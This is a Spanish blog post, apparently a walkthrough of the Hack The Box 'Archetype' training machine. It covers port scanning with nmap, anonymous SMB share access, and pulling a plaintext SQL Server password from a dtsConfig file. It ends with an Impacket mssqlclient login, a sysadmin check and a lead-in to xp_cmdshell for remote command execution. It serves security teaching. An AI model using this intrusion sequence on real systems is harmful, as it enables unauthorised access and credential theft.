---
layout: post
title: Starting Point HTB
category: hacking,programming,htb
permalink: "blog/starting-point"
published: yes
---

## Introducción

Bueno todos sabemos que HackTheBox es una plataforma ahora mismo muy pulida para aprender a hackear máquinas de diferentes sistemas operativos, tanto como `Linux`,`Windows` o `FreeBSD`, en este post se explicará de una forma mas interactiva para empezar a hackear una máquina y algunos pasos fundamentales que hay que seguir, por supuesto el tutorial esta en la misma plataforma de `HackTheBox` pero hay muchos conceptos que dan por hecho que el usuario conoce, en mi caso explicaré cada uno de ellos para profundizar y tener un aprendizaje más óptimo de lo que estamos haciendo.


Antes de nada es muy necesario contar con la conexión VPN para poder empezar a analizar las máquinas normalmente el archivo se descarga desde la misma web y tiene un aspecto mas o menos asi: `rebcesp-startingpoint.ovpn`, nos conectamos mediante la terminal con los comandos:

```lua
openvpn rebcesp-startingpoint.ovpn
...
2021-01-07 23:22:18 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2021-01-07 23:22:18 Preserving previous TUN/TAP instance: tun0
2021-01-07 23:22:18 Initialization Sequence Completed
```


## Enumeracion

HTB nos proporciona una IP para empezar a hackear que en esta ocasión es `10.10.10.27`, lo primero que tenemos que hacer es el reconocimiento de esta máquina es decir, listar sus puertos abiertos junto a los servicios que estan corriendo en cada uno de ellos, para eso se utiliza una herramienta que es `navaja suiza` llamada `Nmap` lo cual es `escaner de puertos MUY potente`. Vamos a usar los parámetros de nmap para poder enumerar los puertos que estan abiertos y servicios que estan corriendo junto a scriptss que contiene la misma herramienta para automatizar el proceso.

```lua
─[rebcesp@parrot]─[~]
└──╼ $nmap -sC -sV 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-07 23:28 CET
Nmap scan report for 10.10.10.27
Host is up (0.044s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-01-01T23:54:25
|_Not valid after:  2051-01-01T23:54:25
|_ssl-date: 2021-01-07T23:45:16+00:00; +1h16m45s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|   Product_Version: 10.0.17763
|_  System_Time: 2021-01-07T23:45:07+00:00
| ssl-cert: Subject: commonName=Archetype
| Not valid before: 2021-01-02T19:54:24
|_Not valid after:  2021-07-04T19:54:24
|_ssl-date: 2021-01-07T23:45:16+00:00; +1h16m45s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h25m20s, deviation: 3h01m27s, median: 1h16m45s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-07T15:45:11-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-07T23:45:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.20 seconds
```
En este punto podemos ver que tenemos dos puertos relevantes que nos interesan son el `445` y el `1433` los cuales estan abiertos y sus servicios que corren son `SMB` y `Microsoft SQL Server 2017`

## ¿Qué es SMB?

Es un protocolo de red que permite compartir archivos, impresoras, etcétera, entre nodos de una red de computadoras que usan el sistema operativo `Microsoft Windows`

También existe `Samba`, que e suna implementación libre del protocolo SMB con las extensiones de Microsoft. Funciona sobre sistemas operativos `GNU/Linux` y en otros `Unix`

## ¿Microsoft SQL Server?

Es un sistema de gestión de base de datos relacional, desarrollado por la empresa Microsfot. SQL Server ha estado tradicionalmente para sistemas operativos Windows de Microsfot, pero desde 2016 está disponible para GNU/Linux y a partir del 2017 para `Docker` también.

Para conectarse a `SQL Server`, se necesita un Login (Usuario a nivel del servidor). Cuando la política se define como `Windows Authentication` y el servidor se combina con las definiciones del `Domain`, los Logins se definen en el `Active Directory`.

## SMB Puerto 445

Al saber que este puerto esta abierto podemos verificar si se ha permitido el acceso anónimo, ya que los archivos compartidos a menudo almacenan archivos de configuración que contienen contraseñas u otra información confidencial. Podemos usar `smbclient` una herramienta para listar los recursos compartidos disponibles

```bash
─[rebcesp@parrot]─[~]
└──╼ $smbclient -N -L \\\\10.10.10.27\\

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

En este punto podemos ver que tenemos una carpeta compartida llamada `backups`, podríamos ver adentro de ello para ver que encontramos y podemos ver que tenemos un archivo llamado `dtsConfig`, esto es una configuración usada con SSIS.

```bash
smbclient -N  \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		10328063 blocks of size 4096. 8161394 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3,1 KiloBytes/sec) (average 3,1 KiloBytes/sec)
smb: \> exit
```

## ¿Qué es SSIS?

Microsoft `SQL Server Integration Services (SSIS)` es una plataforma que permite generar soluciones de integración de datos de alto rendimiento, entre las que se incluyen `paquetes` de extracción, transformación y carga de datos (ETL) para el almacenamiento de datos.

Los paquetes se guardan en la tabla `syssispackages`. Esta tabla incluye una columna de `ID` de carpeta que identifica la carpeta lógica a la que pertenece el `paquete`.


### prod.dtsConfig

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
Podemos ver que en este archivo de configuración contiene una cadena de conexión `SQL` que son las credenciales de usuario local de Windows `ARCHETYPE\sql_svc`

## Foothold

Vamos a intentar conectar con el SQL Server usando un script en python de `Impacket` el cual es `mssqlclient.py`

### ¿Qué es IMPACKET?

Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se centra en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implemetación del protocolo en sí. Los paquetes pueden construirse desde cero, así como analizarse a partir de datos sin procesar, y la API orientada a objetos facilita el trabajo con jerarquías profundas de protocolos.

### mssqlclient.py

Vamos a usar nuestro script en python para acceder a la base de datos la cual tenemos la contraseña que estaba en nuestro archivo de configuración `prod.dtsConfig`

```python
┌─[✗]─[rebcesp@parrot]─[~]
└──╼ $python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
              

-----------   

          1   

SQL> 
```
*USE_SRVROLEMEMBER* Es la función que sirve para determinar si el usuario actual puede realizar una acción que necesite los permisos del rol del servidor.

Si devuleve el valor `1` significa que LOGIN es miembro del grupo role, esto al tener éxito y de hecho, tenemos privilegios de administrador de sistemas.

Esto nos permitirá habilitar `xp_cmdshell` y obtener `RCE` en el host. Intentemos esto, ingresando los siguientes comandos.

### ¿Qué es xp_cmdshell?

Es un procedimiento extendido muy potente que se lo utiliza para ejecutar la línea de comandos de Windows(cmd). Este comando es bastante útil para ejecutar tareas en el sistema operativo tales como copiar archivos, crear carpetas, compartir carpetas, etc. Mediante T-SQL. en pocas palabras podríamos intentar elevar privilegios.






